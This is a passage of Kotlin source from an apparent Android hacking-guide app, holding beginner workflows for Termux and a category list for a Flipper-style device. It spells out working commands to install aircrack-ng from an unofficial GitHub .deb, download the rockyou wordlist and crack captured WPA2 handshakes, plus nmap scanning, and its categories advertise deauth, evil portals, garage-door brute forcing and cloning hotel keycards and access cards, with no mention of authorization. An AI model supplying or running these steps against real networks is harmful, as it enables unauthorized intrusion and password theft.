                    stepNumber = 6,
                    title = "What Works Without Root",
                    description = "These tools all work on your non-rooted Samsung Note 10+:\n• nmap (network scanner) ✓\n• aircrack-ng (password cracker — install via .deb, see WiFi Crack workflow) ✓\n• python / python scripts ✓\n• curl / wget (web requests) ✓\n• netcat (network connections) ✓\n• tshark (read pcap files) ✓\n\nThese DON'T work without root:\n• Live WiFi capture (tcpdump, airmon-ng)\n• tshark live capture\n• hashcat (NOT in Termux repos — use aircrack-ng instead)",
                    tips = listOf("Your AWOK handles the WiFi captures — Termux just cracks the passwords!")
                )
            )
        ),

        Workflow(
            id = "tools_hashcat",
            title = "Crack WiFi Password with aircrack-ng in Termux",
            subtitle = "Install aircrack-ng and crack a captured WPA2 .cap file on your phone",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux installed from F-Droid", "A .cap or .pcap file captured by AWOK (see WiFi capture workflow)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Install aircrack-ng",
                    description = "Open Termux. Type each command and press Enter. aircrack-ng is NOT in the normal Termux store, so you install it a special way:",
                    commands = listOf(
                        Command("Step 1 — update", "apt update && apt upgrade -y", Device.TERMUX),
                        Command("Step 2 — get wget", "pkg install wget -y", Device.TERMUX),
                        Command("Step 3 — install libraries", "apt install libc++ libnl libpcap libsqlite openssl pcre zlib -y", Device.TERMUX),
                        Command("Step 4 — download aircrack-ng", "wget https://raw.githubusercontent.com/pitube08642/aircrack-ng-for-termux/main/dists/termux/aircrack-ng/binary-aarch64/aircrack-ng_3_1.7_aarch64.deb", Device.TERMUX),
                        Command("Step 5 — install it", "dpkg -i aircrack-ng_3_1.7_aarch64.deb", Device.TERMUX)
                    ),
                    tips = listOf("Do NOT try 'pkg install aircrack-ng' — it doesn't exist in Termux that way")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Download a Password List",
                    description = "Download the famous 'rockyou.txt' file — it has 14 million real passwords. If the WiFi password is a common one, aircrack-ng will find it in this list.",
                    commands = listOf(
                        Command("Download rockyou wordlist", "wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
                    ),
                    tips = listOf("130MB file — use WiFi. Takes 2-5 minutes to download")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Copy Your Capture File",
                    description = "Copy the .cap or .pcap file from the Flipper SD card to your phone's Downloads folder. Then in Termux, type:",
                    commands = listOf(
                        Command("Copy file to Termux home", "cp /sdcard/Download/capture.cap ~/", Device.TERMUX)
                    ),
                    tips = listOf("Replace 'capture.cap' with your actual file name")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Crack the Password",
                    description = "Run aircrack-ng with the rockyou wordlist against your capture file:",
                    commands = listOf(
                        Command("Crack with wordlist", "aircrack-ng -w ~/rockyou.txt ~/capture.cap", Device.TERMUX)
                    ),
                    tips = listOf(
                        "If the password is in rockyou.txt, you'll see 'KEY FOUND!' with the password",
                        "If it's not found, the password is either unusual or too complex — try from a PC with GPU for more power"
                    )
                )
            )
        ),

        Workflow(
            id = "tools_termux_setup",
            title = "Set Up Termux Security Tools",
            subtitle = "Install the best hacking tools in Termux — all work without root",
            categoryId = "tools",
            hardware = listOf(Hardware.PHONE),
            prerequisites = listOf("Termux from F-Droid", "Internet connection"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Update First",
                    description = "Always update before installing anything:",
                    commands = listOf(
                        Command("Update", "pkg update && pkg upgrade -y", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Install the Core Tools",
                    description = "Install these tools that all work without root. Type this and press Enter:",
                    commands = listOf(
                        Command("Install tools (all work without root)", "pkg install -y nmap python python-pip curl wget git tshark", Device.TERMUX)
                    ),
                    tips = listOf(
                        "nmap = network scanner (works without root using -sT flag)",
                        "python = for custom scripts",
                        "tshark = read/analyze pcap files (can't capture live without root — that's what your AWOK is for!)",
                        "git = download tools from GitHub",
                        "Note: hashcat is NOT in Termux repos. Use aircrack-ng instead (see the 'Crack WiFi Password' workflow)"
                    )
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Install Python Libraries",
                    description = "Install useful Python security libraries:",
                    commands = listOf(
                        Command("Install Python libs", "pip install scapy requests", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Scan Your Network",
                    description = "Test that nmap works by scanning your local network. Important: use -sT not -sS (SYN scan requires root and won't work):",
                    commands = listOf(
                        Command("Scan your router and devices", "nmap -sT -sV 192.168.1.0/24", Device.TERMUX),
                        Command("Just find alive hosts (fast)", "nmap -sn 192.168.1.0/24", Device.TERMUX)
                    ),
                    tips = listOf(
                        "Change 192.168.1.0/24 to your actual network range — usually 192.168.0.0/24 or 192.168.1.0/24",
                        "This shows every device on your WiFi network with open ports"
                    )
                ),
                WorkflowStep(
                    stepNumber = 5,
                    title = "Read a PCAP File",
                    description = "Once you have a .pcap file captured by AWOK, you can read it with tshark in Termux:",
                    commands = listOf(
                        Command("Read pcap", "tshark -r /sdcard/Download/capture.pcap", Device.TERMUX),
                        Command("Filter just WiFi handshakes", "tshark -r capture.pcap -Y 'eapol'", Device.TERMUX)
                    )
                ),
                WorkflowStep(
                    stepNumber = 6,
                    title = "What Doesn't Work Without Root",
                    description = "Just so you know — these won't work:\n❌ airmon-ng (monitor mode needs root)\n❌ tcpdump -i (live capture needs root)\n❌ tshark -i (live capture needs root)\n❌ nmap -sS (SYN scan needs root)\n\nThat's why you need the AWOK — it handles all the captures!"
                )
            )
        )
    )

    fun getCategories(): List<Category> {
        val countMap = allWorkflows.groupBy { it.categoryId }.mapValues { it.value.size }
        return listOf(
            Category(
                id = "setup",
                title = "Setup & Firmware",
                icon = "ic_settings",
                description = "Install firmware, flash AWOK, pair devices",
                workflowCount = countMap["setup"] ?: 0
            ),
            Category(
                id = "wifi",
                title = "WiFi Attacks",
                icon = "ic_wifi",
                description = "Scan, deauth, capture handshakes, evil portal",
                workflowCount = countMap["wifi"] ?: 0
            ),
            Category(
                id = "subghz",
                title = "Sub-GHz",
                icon = "ic_radio",
                description = "Read/replay remotes, brute force garage doors",
                workflowCount = countMap["subghz"] ?: 0
            ),
            Category(
                id = "rfid",
                title = "RFID 125kHz",
                icon = "ic_rfid",
                description = "Clone access cards and key fobs",
                workflowCount = countMap["rfid"] ?: 0
            ),
            Category(
                id = "nfc",
                title = "NFC 13.56MHz",
                icon = "ic_nfc",
                description = "Clone hotel keycards and Amiibo figures",
                workflowCount = countMap["nfc"] ?: 0
            ),
            Category(
                id = "badusb",
                title = "BadUSB",
                icon = "ic_usb",
                description = "Make Flipper type commands on any computer",
                workflowCount = countMap["badusb"] ?: 0
            ),
            Category(
                id = "bluetooth",
                title = "Bluetooth & BLE",
                icon = "ic_bluetooth",
                description = "BLE spam, scanning, device enumeration",
                workflowCount = countMap["bluetooth"] ?: 0
            ),
            Category(
                id = "infrared",
                title = "Infrared",
                icon = "ic_ir",
                description = "Universal remote, learn and replay any signal",
                workflowCount = countMap["infrared"] ?: 0
            ),
            Category(
                id = "ibutton",
                title = "iButton",
                icon = "ic_key",
                description = "Clone metal contact keys for intercoms",
                workflowCount = countMap["ibutton"] ?: 0
            ),
            Category(
                id = "gpio",
                title = "GPIO & Combos",
                icon = "ic_gpio",
                description = "UART hacking and AWOK+Flipper combo attacks",
                workflowCount = countMap["gpio"] ?: 0
            ),
            Category(
                id = "connect",
                title = "Flipper BT Control",
                icon = "ic_link",
                description = "Control Flipper from PenThis! via Bluetooth",
                workflowCount = countMap["connect"] ?: 0
            ),
            Category(
                id = "tools",
                title = "Termux Tools",
                icon = "ic_terminal",
                description = "Kali Linux, aircrack-ng, and Termux setup",
                workflowCount = countMap["tools"] ?: 0
            )
        )
    }

    fun getWorkflowsByCategory(categoryId: String): List<Workflow> =
        allWorkflows.filter { it.categoryId == categoryId }

    fun getWorkflowById(id: String): Workflow? =
        allWorkflows.firstOrNull { it.id == id }
}
